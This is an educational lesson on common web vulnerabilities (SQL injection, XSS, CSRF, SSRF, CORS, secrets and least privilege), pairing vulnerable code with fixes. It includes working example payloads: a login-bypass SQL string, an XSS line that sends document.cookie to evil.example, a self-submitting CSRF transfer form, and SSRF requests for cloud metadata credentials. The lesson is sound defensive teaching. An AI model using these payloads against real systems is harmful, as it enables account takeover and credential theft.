# Web Security Vulnerabilities

> Most real-world breaches aren't movie-style hacking; they're a handful of well-known mistakes repeated in new code. Learn to recognize these patterns and you'll catch bugs in code review that would otherwise end up in the news.

## The big idea

Almost every bug in this lesson has the same root cause: **data gets treated as instructions**.

Imagine a bank teller who reads aloud whatever is written on your deposit slip, and the vault follows the teller's spoken commands. You write in the "name" field: *"Kim. Also, open the vault."* The teller reads it out, and the vault opens. The slip was meant to be **data**; it got **executed** as a **command**.

- SQL injection: user input becomes part of a SQL **command**.
- XSS: user input becomes part of a page's **JavaScript/HTML**.
- SSRF: user input becomes the **address** your server connects to.
- CSRF: an attacker's page makes *your browser* send a **command** with your cookies.

The fixes follow the same idea: keep data and instructions separate, check where requests come from, and give every component only the power it needs.

The **OWASP Top 10** (from the Open Worldwide Application Security Project) is the well-known list of the most common web risks; nearly everything below appears on it.

## SQL injection

The bug: building a query by gluing strings together.

```js
// VULNERABLE
const sql = "SELECT * FROM users WHERE email = '" + email + "' AND password_hash = '" + hash + "'";
```

If someone types this as their email:

```text
' OR '1'='1' --
```

the query becomes:

```sql
SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password_hash = '...'
```

`'1'='1'` is always true and `--` comments out the rest. The attacker logs in as the first user, often the admin. Variants can read whole tables (`UNION SELECT`), or delete them.

**The fix: parameterized queries** (also called prepared statements). The SQL text and the values are sent to the database **separately**, so values can never become SQL syntax:

```js
// SAFE (node-postgres style placeholders)
const { rows } = await db.query(
  'SELECT * FROM users WHERE email = $1',
  [email]
);
```

Escaping by hand is fragile; placeholders are the real fix. ORMs and query builders use them under the hood, but watch out for "raw" query helpers. Defense in depth: the app's database user should not have permission to `DROP TABLE` (least privilege, below).

## Cross-site scripting (XSS)

The bug: user-supplied text is inserted into a page as **HTML**, so a `<script>` (or an `onerror=` attribute) in it runs in other users' browsers, with full access to that page: it can read the DOM, make requests as the user, and steal non-HttpOnly cookies.

```js
// VULNERABLE: comment text is treated as HTML
commentDiv.innerHTML = comment.text;

// comment.text = '<img src=x onerror="fetch(\'https://evil.example/?c=\' + document.cookie)">'
```

Three flavors:

- **Stored XSS:** the payload is saved (a comment, a profile name) and served to everyone who views it.
- **Reflected XSS:** the payload is in a URL (`/search?q=<script>…`) and echoed back in the response; the attacker sends victims the link.
- **DOM XSS:** front-end JavaScript takes something like `location.hash` and writes it into the page with `innerHTML`.

**Fixes:**

- Insert text **as text**: `el.textContent = comment.text`. Modern frameworks (React, Vue, Svelte) escape by default; the danger is the escape hatches like `dangerouslySetInnerHTML` or `v-html`.
- On the server, **escape output for its context** (HTML body, attribute, URL, JavaScript are different).
- If you must allow some HTML (rich text), use a well-tested sanitizer like DOMPurify, never your own regex.
- **Content Security Policy (CSP)** header, e.g. `Content-Security-Policy: script-src 'self'`, tells the browser to refuse inline scripts and scripts from other sites — a strong safety net.
- `HttpOnly` cookies (Day 47) so even a successful XSS can't read the session cookie.

```js
// A tiny HTML escaper, to see what "escaping" means
const escapeHtml = (s) => s
  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;').replace(/'/g, '&#39;');

console.log(escapeHtml('<img src=x onerror=alert(1)>'));
// &lt;img src=x onerror=alert(1)&gt;   ← shown as text, never runs
```

## Cross-site request forgery (CSRF)

The bug: the browser automatically attaches your cookies to requests to a site, **even when another site triggers the request**.

You're logged in to `bank.example`. You visit `evil.example`, which contains:

```html
<form action="https://bank.example/transfer" method="POST" id="f">
  <input name="to" value="attacker"><input name="amount" value="5000">
</form>
<script>document.getElementById('f').submit()</script>
```

Your browser sends the POST to the bank **with your session cookie**. The bank sees a valid session and transfers the money. The attacker never saw your cookie; they just made your browser use it.

**Fixes:**

- **`SameSite` cookies.** `SameSite=Lax` (Chrome's default for cookies without the attribute since 2020) stops cookies on cross-site POSTs; `Strict` stops them on all cross-site requests.
- **CSRF tokens:** a random value tied to the session, embedded in your own forms and required on every state-changing request. The attacker's page can't read it.
- **Check the `Origin` header** on state-changing requests.
- **Never change state with GET.** `GET /delete-account` can be triggered by an `<img>` tag.

APIs that authenticate with an `Authorization: Bearer` header (not cookies) aren't vulnerable to CSRF in the same way, because browsers don't attach that header automatically.

## Server-side request forgery (SSRF)

The bug: your server fetches a URL that the user controls. Common features: "import from URL", link previews, webhooks, image downloads.

```js
// VULNERABLE
app.get('/preview', async (req, res) => {
  const r = await fetch(req.query.url);
  res.send(await r.text());
});
```

The attacker asks for `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — the **cloud metadata service**, reachable only from inside the cloud machine, which can hand out the server's cloud credentials. Or `http://localhost:6379` (an unprotected Redis), or `http://10.0.0.5/admin` (an internal admin panel). Your server is *inside* the firewall, and the attacker borrows its position. SSRF was a key step in the widely reported 2019 Capital One breach.

**Fixes:**

- **Allowlist** destinations when you can (only `https`, only known domains).
- Otherwise, **resolve the hostname and block private/internal ranges**: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, and so on. Check the **resolved IP**, not the hostname text, and connect to that same IP (otherwise **DNS rebinding** can swap the answer between check and use, Day 13). Re-check on every redirect.
- Run fetchers in an isolated network with no route to internal services.
- On AWS, require **IMDSv2** for the metadata service; it needs a session token obtained with a PUT request, which a simple SSRF can't do.

## CORS: what it is, and what it isn't

Browsers enforce the **same-origin policy**: JavaScript on `https://a.example` can't read responses from `https://b.example`. An **origin** is scheme + host + port. This is what stops `evil.example`'s JavaScript from reading your bank balance with your cookies.

**CORS** (Cross-Origin Resource Sharing) is how a server **relaxes** that rule on purpose: it sends headers like `Access-Control-Allow-Origin: https://app.example` to say "JavaScript from that origin may read my responses". For non-simple requests (custom headers, `PUT`, JSON bodies) the browser first sends a **preflight** `OPTIONS` request to ask.

Key points people get wrong:

- CORS **protects users' browsers**, not your server. `curl` and attacker scripts ignore it completely. It is not authentication.
- CORS doesn't stop the request from being *sent*; it stops the page from *reading* the response. (That's why CSRF still needs its own defense.)
- Dangerous config: reflecting any `Origin` back **with** `Access-Control-Allow-Credentials: true`. That lets any website read logged-in users' data. Note `Access-Control-Allow-Origin: *` is not allowed together with credentials, which is why people reach for the dangerous reflection.

## Secrets handling

**Secrets** are passwords, API keys, private keys, database URLs.

- **Never commit them to git.** Bots scan public GitHub for keys within minutes of a push. Deleting the file in a new commit doesn't help: it's in history.
- Load them at runtime from environment variables or, better, a **secrets manager** (AWS Secrets Manager, HashiCorp Vault, Kubernetes Secrets — Day 49) with access control and audit logs.
- **Rotate** secrets regularly and immediately after any leak. Prefer short-lived credentials (cloud IAM roles) over long-lived keys.
- Don't log them (Day 46), don't put them in URLs, don't ship them in front-end code: anything in the browser bundle is public.
- Add a secret scanner to CI (Day 50).

## Least privilege

Give every user, service and key **only the permissions it needs**, nothing more. Then a bug in one place causes a small, contained problem instead of a disaster.

- The web app's DB user can `SELECT/INSERT/UPDATE` its tables, not `DROP` them or read the billing schema.
- The image-resizer service can read one storage bucket, not all of them.
- Engineers get production access temporarily when needed, not permanently.

Combined with **defense in depth** (several independent layers: parameterized queries *and* least-privilege DB users *and* a WAF *and* monitoring), one mistake doesn't sink you.

## In an interview

Security usually comes up as *"how do you secure this?"* or as a code-review exercise. Interviewers want you to name specific vulnerabilities, explain the mechanism in one sentence, and give the standard fix, not "we'll sanitize inputs".

A strong answer: *"All SQL goes through parameterized queries. User content is rendered as text, with framework auto-escaping and a strict CSP. Session cookies are HttpOnly, Secure and SameSite=Lax, and state-changing endpoints also check a CSRF token or the Origin header. Any feature that fetches user-supplied URLs goes through an allowlist or a fetcher that blocks private IP ranges after DNS resolution. CORS is restricted to our own origins. Secrets live in a secrets manager and are rotated, and each service gets least-privilege credentials."*

## Common mistakes

- **"We sanitize input."** Vague. Each sink needs its own fix: placeholders for SQL, output encoding for HTML, IP checks for URLs.
- **Thinking CORS is a security wall for your API.** It only governs what browsers let pages read.
- **Using GET for actions.** It invites CSRF and gets triggered by prefetchers and crawlers.
- **Blocking `localhost` by string match** for SSRF. `127.1`, `0x7f000001`, IPv6 and DNS names pointing at internal IPs all bypass it. Check resolved IPs.
- **Removing a leaked key from the repo instead of rotating it.** Rotate first.

## Before moving on

- [ ] I can explain the "data treated as instructions" pattern
- [ ] I can spot and fix SQL injection and XSS in code
- [ ] I can explain how CSRF works and three defenses
- [ ] I can explain SSRF, why the cloud metadata endpoint matters, and how to block it
- [ ] I can say precisely what CORS does and doesn't do
- [ ] I can describe how secrets should be stored and what to do after a leak

## Go deeper (optional)

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) (SQL injection, XSS, CSRF, SSRF prevention)
- [MDN: Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — free hands-on labs
